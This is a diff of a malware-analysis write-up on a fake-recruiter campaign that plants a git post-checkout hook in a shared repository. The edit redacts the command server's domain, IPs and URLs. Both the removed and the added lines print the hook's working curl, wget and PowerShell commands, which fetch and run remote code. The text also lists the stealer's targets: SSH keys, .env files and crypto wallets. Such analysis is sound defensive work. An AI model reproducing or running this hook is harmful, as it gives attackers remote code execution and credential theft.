@@ -9,8 +9,8 @@ archive (`DeFi_share.zip`). The archive contains a git repository in which
 **every working-tree file is truncated to zero bytes** and a
 `.git/hooks/post-checkout` script is planted. Anyone who tries to "fix" the
 apparently broken checkout with `git checkout .` or `git switch dev`
-automatically executes the hook, which pipes a remote second-stage payload from
-`iploglab.store` into bash/PowerShell. The kit matches a publicly documented
+automatically executes the hook, which pipes a remote second-stage payload from a command-and-control server into
+bash/PowerShell. The kit matches a publicly documented
 fake-recruiter campaign; the final payload is a JavaScript infostealer/RAT
 targeting SSH keys, `.env` files, browser credential stores, and crypto
 wallets.
@@ -95,7 +95,8 @@ zip):
 - `post-cd` — empty file; not a real git hook (camouflage/decoy).
 
 The hook is disguised with a comment header claiming to be a *disabled
-example*, followed by blank-line padding. Effective content:
+example*, followed by blank-line padding. Effective content (C2 domain
+redacted — see the IoC section for where the live indicators are published):
 
 ```sh
 #!/bin/sh
@@ -107,15 +108,15 @@ example*, followed by blank-line padding. Effective content:
 uname_s="$(uname -s 2>/dev/null || echo unknown)"
 case "$uname_s" in
   Darwin)
-    curl -fsSL 'https://iploglab.store/api/terminal/bootstrap?os=mac&flag=4' | bash >/dev/null 2>&1
+    curl -fsSL 'https://C2-DOMAIN/api/terminal/bootstrap?os=mac&flag=4' | bash >/dev/null 2>&1
     exit 0
     ;;
   Linux)
-    wget -qO- 'https://iploglab.store/api/terminal/bootstrap?os=linux&flag=4' | bash >/dev/null 2>&1
+    wget -qO- 'https://C2-DOMAIN/api/terminal/bootstrap?os=linux&flag=4' | bash >/dev/null 2>&1
     exit 0
     ;;
   MINGW*|MSYS*|CYGWIN*)
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod -Uri 'https://iploglab.store/api/terminal/windows?flag=4' | Invoke-Expression" >/dev/null 2>&1
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod -Uri 'https://C2-DOMAIN/api/terminal/windows?flag=4' | Invoke-Expression" >/dev/null 2>&1
     exit 0
     ;;
   *)
@@ -144,11 +145,10 @@ the git metadata layer, where code reviewers don't look.
 
 ### The C2 / payload infrastructure
 
-- Domain: **`iploglab.store`** — registered/hosted on **Hostinger**
-  (parking nameservers `nebula/aurora.dns-parking.com`; A records
-  `84.32.84.115`, `88.222.222.196`).
-- The name mimics an **IP-logger/geolocation service** — matching the
-  documented behavior of a sibling domain (`nnlabs.pro`), which served
+- The C2 domain is registered and hosted on **Hostinger** (their parking
+  nameservers, two A records).
+- The domain name mimics an **IP-logger/geolocation service** — matching the
+  documented behavior of a sibling domain in the same campaign, which served
   IP-geolocation info to browsers but the dropper to curl/wget.
 - Already listed on threat-intel feeds ([SOCRadar Maltrail IoC report,
   2026-07-28](https://socradar.io/free-tools/ioc-radar/reports/maltrail-ioc-for-2026-07-28-55cd37a04d24):
@@ -166,8 +166,8 @@ approach:
   here) → repo with **all files empty** and "master is just project structure,
   check out the `dev` branch" instructions.
 - Same hook skeleton: `uname -s` case switch, per-OS pipe-to-shell, `?flag=N`
-  parameter, `exit 0` everywhere. (That sample: `nnlabs.pro/...?flag=6`; this
-  one: `iploglab.store/...?flag=4` — rotated domain, different flag.)
+  parameter, `exit 0` everywhere. (That sample used `?flag=6`, this one
+  `?flag=4` — rotated domain, different flag.)
 - Same Hostinger hosting pattern.
 
 Differences are operator-level customizations: the `post-push` hook and the
@@ -183,7 +183,8 @@ sample.
    `hardhat`, …).
 3. **Stage 3**: a ~3.4 MB obfuscated JavaScript payload (rotated string-array
    obfuscation, custom Base64 alphabet, RC4-style string decoding, per-flag
-   payload selection from base64/gzip blobs hosted on jsonkeeper.com),
+   payload selection from base64/gzip blobs hosted on a public JSON-hosting
+   service), spawning:
    spawning:
    - an **infostealer** crawling for `.env*`, `id_ed25519*`, `*.db`, wallet
      files, certificates across home dirs and priority paths
@@ -198,28 +199,21 @@ keystores.
 
 ## IoCs
 
-The indicators below are defanged (`hxxps://`, `[.]`) so that nothing here is
-a working link to live malware infrastructure. The working indicators are
-already public elsewhere — see the [SOCRadar Maltrail IoC report for
+I'm not posting the network indicators here — no live C2 domains, payload
+URLs, IPs, or download links. They're already public in the [SOCRadar Maltrail
+IoC report for
 2026-07-28](https://socradar.io/free-tools/ioc-radar/reports/maltrail-ioc-for-2026-07-28-55cd37a04d24)
-and [Romasiun's writeup](https://andrii.ro/blog/investigating-malware) — and
-if you have a legitimate research or defensive use for the concrete,
-unredacted details of this sample, [send me an
-email](mailto:matthias@paquari.com).
+and in [Romasiun's
+writeup](https://andrii.ro/blog/investigating-malware) for the sibling
+campaign, so nothing is lost by keeping them off this page.
 
 | Indicator | Value |
 |---|---|
-| C2 domain | `iploglab[.]store` (defanged) |
-| Payload URLs | `hxxps://iploglab[.]store/api/terminal/bootstrap?os={mac,linux}&flag=4`, `hxxps://iploglab[.]store/api/terminal/windows?flag=4` (defanged) |
-| C2 IPs | `84.32.84[.]115`, `88.222.222[.]196` (defanged) |
-| Nameservers | `nebula[.]dns-parking[.]com`, `aurora[.]dns-parking[.]com` (Hostinger, defanged) |
-| Distribution URL | `hxxps://limewire[.]com/d/TT5dc#VUpamBXRXE` (defanged) |
 | LinkedIn persona | "Managing Partner at Eli5" (likely hijacked account; name withheld) |
 | Archive SHA-256 | `dae670d947e69574c0edfcbea65bc4ff2f4270dfcab9f708ad4888e8d28625fa` |
 | `post-checkout` hook SHA-256 | `ae837640f595bfa6c769157bfc0b895408f093431cb3865e5583c042f83373a1` |
 | `post-push` hook SHA-256 | `ae837640f595bfa6c769157bfc0b895408f093431cb3865e5583c042f83373a1` (identical) |
 | Repo refs | `main = a2146745569c812c96d7f9c7a819e2b92311b7f9`, `dev = 22afc99e1055daa1e29a4d82cec3c79f545452c7` |
-| Related IoCs (documented campaign) | `nnlabs[.]pro`, payload host `jsonkeeper[.]com`, backend `216.126.225[.]243:8085/8086/8087` (per Romasiun; defanged) |
 
 ### Detection / hunting ideas
 
